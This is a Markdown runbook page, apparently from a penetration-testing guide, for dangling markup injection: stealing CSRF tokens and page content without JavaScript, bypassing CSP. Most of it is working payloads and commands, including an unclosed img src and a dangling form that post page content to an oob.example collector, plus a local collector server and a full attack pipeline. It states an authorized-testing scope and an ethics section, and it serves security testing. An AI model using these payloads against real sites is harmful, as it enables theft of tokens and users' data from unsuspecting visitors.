---
title: "Dangling Markup — Scriptless Injection"
description: "Exfiltrating data with unclosed tags and attributes, forms and images, and bypassing CSP without any JavaScript execution."
phase: Web
order: 26
tags:
  - dangling-markup
  - csp-bypass
  - exfiltration
  - web
tools:
  - burp suite
  - browser devtools
updated: 2026-10-01
---

A dangling markup runbook for authorized pentests / bug bounty on **in-scope** targets only. Goal: exploit an HTML injection where scripts are blocked, leaving a tag unclosed so the browser sends following page content (tokens, emails, CSRF) to an attacker URL.

## 1. Confirm HTML injection without script execution

```bash
# Look for reflection points and test a benign tag
curl -s "https://target.com/?q=injectmarker" | grep -io "injectmarker"

# Check if a script tag is stripped or CSP-blocked
curl -s "https://target.com/?q=%3Cscript%3Ealert(1)%3C/script%3E" | grep -io "<script" | head
```

If HTML is preserved but scripts are neutralized (filter or CSP), dangling markup is the path.

## 2. Exploit an unclosed attribute

The classic form: break out of an existing tag and open an attribute that swallows following markup until it finds a closing quote.

```bash
# Inject an opening quote + attribute that fetches a URL
curl -s "https://target.com/?q=%22%3E%3Cimg%20src='https://oob.example/collect?" | grep -io "oob.example"

# The browser sends everything until the next quote as part of the URL
# Format the payload so it survives HTML encoding in the app
```

## 3. Use a form to capture a CSRF token

A common scriptless attack steals a CSRF token rendered lower on the page.

```bash
# Dangling form that posts surrounding markup to your server
cat > payload.txt <<'EOF'
<form action="https://oob.example/collect" method="GET"><input name="x" value="
EOF

# URL-encode and inject where markup is reflected before the target token
printf '%s' "$(cat payload.txt)" | jq -sRr @uri
```

## 4. Base64 / scriptless exfiltration

When you only need to leak a token, combine a dangling attribute with a decode step on your receiver.

```bash
# Serve a collector and log incoming requests
python3 -m http.server 8000 > collector.log 2>&1 &
tail -f collector.log
```

Watch the log for the leaked substring arriving in the path or query.

## 5. CSP considerations

Dangling markup does not require JavaScript, so `script-src` does not stop it. Relevant controls are `img-src`, `form-action`, `base-uri`, and `connect-src`.

```bash
# Check which of those directives are present
curl -sI "https://target.com/" | grep -i "content-security-policy" \
  | grep -ioE "img-src[^;]*|form-action[^;]*|base-uri[^;]*|connect-src[^;]*"
```

If `img-src` and `form-action` are unrestricted, the leak succeeds.

## 6. Confirm with a headless check

```bash
# Render the injected page and watch for the callback
curl -s "https://target.com/?q=<dangling-payload>" -o page.html
grep -io "oob.example" page.html
```

## Full pipeline

```bash
# 1. Confirm HTML injection and script blocking
curl -s "https://target.com/?q=%3Cscript%3Ealert(1)%3C/script%3E" | grep -io "<script" | head
curl -sI "https://target.com/" | grep -i "content-security-policy"

# 2. Check exfil-relevant directives
curl -sI "https://target.com/" | grep -i "content-security-policy" | grep -ioE "img-src[^;]*|form-action[^;]*|base-uri[^;]*"

# 3. Build the dangling payload
cat > payload.txt <<'EOF'
<form action="https://oob.example/collect" method="GET"><input name="x" value="
EOF
printf '%s' "$(cat payload.txt)" | jq -sRr @uri

# 4. Start a collector and inject
python3 -m http.server 8000 > collector.log 2>&1 &
curl -s "https://target.com/?q=<dangling-payload>" -o page.html

# 5. Watch for the leak
tail -f collector.log
```

## Ethics & legality

- Only inject on pages within the authorized scope and only with accounts you own.
- Leak your own test token to demonstrate impact; never harvest real users' data.
- Keep request volume low and avoid persistence.
- Document the payload, the leaked marker, and the collector log as evidence.
